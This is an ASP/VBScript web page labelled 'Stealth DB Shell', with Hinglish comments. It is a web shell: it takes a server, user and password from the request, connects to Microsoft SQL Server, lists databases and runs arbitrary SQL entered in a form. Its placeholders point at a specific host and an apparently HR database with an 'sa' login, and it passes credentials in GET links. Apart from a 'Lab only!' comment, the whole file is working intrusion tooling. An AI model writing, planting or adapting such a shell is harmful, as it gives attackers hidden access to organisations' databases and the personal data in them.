<%@ Language=VBScript %>
<%
' Stealth DB Shell - TCP/IP Force + SQL 2012 Fix (Lab only!)

Dim Conn, RS, ConnStr, ErrMsg
Dim srv, dbn, usr, pwd, act, qry, tbl

srv = Trim(Request("server") & Request.Form("server"))
dbn = Trim(Request("dbname") & Request.Form("dbname"))
usr = Trim(Request("user") & Request.Form("user"))
pwd = Trim(Request("pass") & Request.Form("pass"))
act = Request("act")
qry = Request("query")
tbl = Request("tbl")

ErrMsg = ""

If srv <> "" Then
    ' TCP force + SQL Native Client (SQL 2012 ke liye reliable)
    ConnStr = "Provider=SQLNCLI11;Server=tcp:" & srv & ",1433;"
    If dbn <> "" Then ConnStr = ConnStr & "Database=" & dbn & ";"
    ConnStr = ConnStr & "Uid=" & usr & ";Pwd=" & pwd & ";"

    ' Agar Native Client nahi hai to ODBC fallback (uncomment kar try kar)
    ' ConnStr = "Driver={SQL Server};Server=tcp:" & srv & ",1433;Database=" & dbn & ";Uid=" & usr & ";Pwd=" & pwd & ";"

    Set Conn = Server.CreateObject("ADODB.Connection")
    On Error Resume Next
    Conn.Open ConnStr
    If Err.Number <> 0 Then
        ErrMsg = "Connection Failed: " & Err.Description & " (Code: " & Err.Number & ")<br><br>" & _
                 "Fix Steps:<br>" & _
                 "1. SQL Configuration Manager → TCP/IP Enable + Port 1433 set kar<br>" & _
                 "2. SQL Server Browser service Start kar<br>" & _
                 "3. Firewall port 1433 allow kar<br>" & _
                 "4. Server name sahi daal: ATT-N-ACC ya uska IP (ping ATT-N-ACC se check kar)<br>" & _
                 "5. Agar instance hai to ATT-N-ACC\INSTANCENAME daal"
        Set Conn = Nothing
    End If
    On Error Goto 0
End If
%>

<html>
<head><title>Stealth DB Shell - TCP Force</title></head>
<body style="font-family:consolas; background:#000; color:#0f0; padding:20px;">

<h2>DB Shell (Connection Form)</h2>

<form method="post">
    Server/IP: <input name="server" value="<%=Server.HTMLEncode(srv)%>" size="40" placeholder="ATT-N-ACC ya 192.168.x.x ya ATT-N-ACC\SQLEXPRESS"><br><br>
    DB Name: <input name="dbname" value="<%=Server.HTMLEncode(dbn)%>" size="40" placeholder="HRSuiteHC"><br><br>
    User ID: <input name="user" value="<%=Server.HTMLEncode(usr)%>" size="40" placeholder="sa"><br><br>
    Password: <input type="password" name="pass" value="<%=Server.HTMLEncode(pwd)%>" size="40" placeholder="HRPass123"><br><br>
    <input type="submit" value="Connect">
</form>

<% If ErrMsg <> "" Then %>
    <div style="color:red; background:#300; padding:15px; margin:15px 0; border:2px solid red; font-weight:bold;">
        <%=ErrMsg%>
    </div>
<% ElseIf Conn Is Nothing Then %>
    <p style="color:yellow;">Connect first. Server mein ATT-N-ACC daal, ya IP try kar.</p>
<% Else %>
    <div style="color:lime; background:#030; padding:15px; border:2px solid lime;">
        Connected! Server: <%=srv%> | DB: <%=dbn%>
    </div>

    <!-- Databases List -->
    <h3>Databases (access wale)</h3>
    <%
    Set RS = Conn.Execute("SELECT name FROM sys.databases WHERE database_id > 4 ORDER BY name")
    Do While Not RS.EOF
        Response.Write "<a href='?act=tables&server=" & Server.URLEncode(srv) & "&user=" & Server.URLEncode(usr) & "&pass=" & Server.URLEncode(pwd) & "&dbname=" & Server.URLEncode(RS("name")) & "'>" & RS("name") & "</a><br>"
        RS.MoveNext
    Loop
    RS.Close
    %>

    <!-- Custom Query for Testing -->
    <h3>Custom SQL (tables test karne ke liye)</h3>
    <form method="get">
        <input type="hidden" name="server" value="<%=Server.URLEncode(srv)%>">
        <input type="hidden" name="user" value="<%=Server.URLEncode(usr)%>">
        <input type="hidden" name="pass" value="<%=Server.URLEncode(pwd)%>">
        <input type="hidden" name="dbname" value="<%=Server.URLEncode(dbn)%>">
        Query: <input name="query" size="80" value="SELECT @@version"><br>
        <input type="submit" value="Run">
    </form>

    <!-- Baaki tables/browsing code yahan se copy kar sakta hai purane se (act=tables, browse etc.) -->

<% End If %>

</body>
</html>

<%
If IsObject(RS) Then RS.Close
If IsObject(Conn) Then Conn.Close
%>
